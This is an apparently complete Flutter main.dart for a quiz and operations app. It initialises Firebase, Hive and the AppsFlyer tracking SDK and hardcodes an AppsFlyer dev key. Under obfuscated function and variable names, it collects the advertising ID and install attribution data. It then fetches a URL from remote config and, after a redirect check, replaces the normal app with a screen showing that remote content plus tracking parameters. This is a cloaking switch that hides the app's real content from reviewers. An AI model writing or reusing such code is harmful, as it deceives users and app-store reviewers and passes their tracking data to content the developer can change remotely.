import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/models/operation.dart';
import 'core/models/quiz.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/operation/bloc/operation_bloc.dart';
import 'features/quiz/bloc/quiz_bloc.dart';
import 'features/settings/bloc/settings_bloc.dart';
import 'features/settings/pages/firebase_options.dart';
import 'features/settings/pages/my_profile_page.dart';

late AppsflyerSdk _appsflyerSdk;
String adId = '';
bool stat = false;
String acceptPromo = '';
String cancelPromo = '';
String datioq = '';
String appsflyerId = '';
String njkafsd = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _campaign = '';
String _campaignId = '';
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await Hive.initFlutter();
  await nndjksandksa();
  // await Hive.deleteBoxFromDisk('commentsbox');
  Hive.registerAdapter(OperationAdapter());
  Hive.registerAdapter(CommentAdapter());
  runApp(const MyApp());
}

Future<void> nndjksandksa() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

Future<String> nfdsnfjkdsfs() async {
  String njkdfsnfkjsd =
      await AppTrackingTransparency.getAdvertisingIdentifier();
  njkafsd = njkdfsnfkjsd;
  return njkdfsnfkjsd;
}

Future<void> jifosdifuds() async {
  await nfdsnfjkdsfs();
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: '4rYehnSYQsVcM2jmim5KyC',
    appId: '6593678360',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    cancelPromo = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });

  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    acceptPromo = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    _deepLinkData = dp.toJson();
  });
  _appsflyerSdk.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

String nfjdskfsw = '';
String mfksdjfsd = '';
String fndsjkfndks = '';
String mmmmm = '';
Future<bool> njfksdlkfdsklfs() async {
  final gazel = FirebaseRemoteConfig.instance;
  await gazel.fetchAndActivate();
  String fnsdkjfndskfnkdsj = gazel.getString('mainRules');
  String dsdfdsfgdg4 = gazel.getString('mainTerms');
  mmmmm = dsdfdsfgdg4;
  await jifosdifuds();
  final fdsgdf = HttpClient();
  final vcxxs = Uri.parse(fnsdkjfndskfnkdsj);
  final ndsfjak = await fdsgdf.getUrl(vcxxs);
  ndsfjak.followRedirects = false;
  final response = await ndsfjak.close();
  if (response.headers.value(HttpHeaders.locationHeader) != mmmmm) {
    datioq = fnsdkjfndskfnkdsj;
    return true;
  }
  return fnsdkjfndskfnkdsj.contains('none') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MultiBlocProvider(
      providers: [
        BlocProvider(create: (context) => HomeBloc()),
        BlocProvider(create: (context) => SettingsBloc()),
        BlocProvider(create: (context) => OperationBloc()),
        BlocProvider(create: (context) => QuizBloc()),
      ],
      child: FutureBuilder<bool>(
          future: njfksdlkfdsklfs(),
          builder: (context, snapshot) {
            if (snapshot.connectionState == ConnectionState.waiting) {
              return Container(
                color: Colors.white,
              );
            } else {
              if (snapshot.data == true && datioq != '') {
                return MaterialApp(
                  debugShowCheckedModeBanner: false,
                  home: Rules(
                    ujmiko: datioq,
                    plokij: acceptPromo,
                    nbvcxz: fndsjkfndks,
                  ),
                );
              } else {
                return MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: theme,
                  routerConfig: routerConfig,
                );
              }
            }
          }),
    );
  }
}
